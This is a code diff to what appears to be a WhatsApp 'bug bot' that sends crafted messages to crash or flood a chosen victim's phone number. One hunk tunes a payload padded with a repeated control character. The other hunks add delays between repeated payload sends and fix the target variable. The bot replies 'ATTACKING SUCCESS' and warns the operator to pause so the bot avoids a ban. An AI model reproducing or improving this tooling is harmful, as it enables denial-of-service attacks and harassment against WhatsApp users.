@@ -341,7 +341,7 @@ const wanted = {
                     },
                     "nativeFlowResponseMessage": {
                         "name": "galaxy_message",
-                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(10000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                         "version": 3
                     }
                 }
@@ -2152,13 +2152,22 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
+await sleep(1500);
+await buk1(target, viper);
+await sleep(1500);
 sendQP(target, wanted);
+await sleep(1500);
 await sendQP(target, wanted);
+await sleep(1500);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
+await sleep(1500);
+await beta2(target, viper)
+await sleep(1500);
 await sendSessionStructure(target, wanted);
+await sleep(1500);
 await beta1(viper, target);
+await sleep(1500);
+await beta1(target, viper);
 darkphonk = fs.readFileSync('./database/suki.mp3')
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
@@ -2187,13 +2196,22 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
+await sleep(1500);
+await buk1(target, viper);
+await sleep(1500);
 sendQP(target, wanted);
+await sleep(1500);
 await sendQP(target, wanted);
+await sleep(1500);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
+await sleep(1500);
+await beta2(target, viper)
+await sleep(1500);
 await sendSessionStructure(target, wanted);
+await sleep(1500);
 await beta1(viper, target);
+await sleep(1500);
+await beta1(target, viper); 
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2223,13 +2241,22 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
+await sleep(1500);
+await buk1(target, viper);
+await sleep(1500);
 sendQP(target, wanted);
+await sleep(1500);
 await sendQP(target, wanted);
+await sleep(1500);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
+await sleep(1500);
+await beta2(target, viper)
+await sleep(1500);
 await sendSessionStructure(target, wanted);
+await sleep(1500);
 await beta1(viper, target);
+await sleep(1500);
+await beta1(target, viper); 
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2292,13 +2319,22 @@ var contactInfo = await viper.onWhatsApp(target);
 reply(bugres)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
-await buk1(viper, target);
+await sleep(1500);
+await buk1(target, viper);
+await sleep(1500);
 sendQP(target, wanted);
+await sleep(1500);
 await sendQP(target, wanted);
+await sleep(1500);
 await beta2(viper, target, (cct = true), (Ptcp = true));
-await beta2(viper, target)
+await sleep(1500);
+await beta2(target, viper)
+await sleep(1500);
 await sendSessionStructure(target, wanted);
+await sleep(1500);
 await beta1(viper, target);
+await sleep(1500);
+await beta1(target, viper); 
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2314,20 +2350,7 @@ if (!isPremium) return reply(mess.only.premium)
 	if (!q) return reply(`Example:\n ${prefix + command} 91xxx`)
 victim = text.split("|")[0]
 target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-
-victim = text.split("|")[0]
-Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(Xreturn);
+var contactInfo = await viper.onWhatsApp(target);
   if (victim == "6283809358811") {
     return;
     }
@@ -2341,16 +2364,16 @@ var contactInfo = await viper.onWhatsApp(Xreturn);
 reply(`In process`)
 	await sleep(3000)
 for (let i = 0; i < 10; i++) {
-    await XeonXRobustV2(viper, Xreturn)
+    await XeonXRobustV2(viper, target)
     await sleep(2000)
-    await XeonXRobust(Xreturn, viper, (cct = true), (Ptcp = true));
+    await XeonXRobust(target, viper, (cct = true), (Ptcp = true));
     await sleep(2000)
     await XeonXRobustV2(viper, target)
     }
 	sendMessageWithMentions(
-    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
+    "Successfully Sent Bug To @" + target.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [Xreturn]
+    [target]
   );
 break;
 
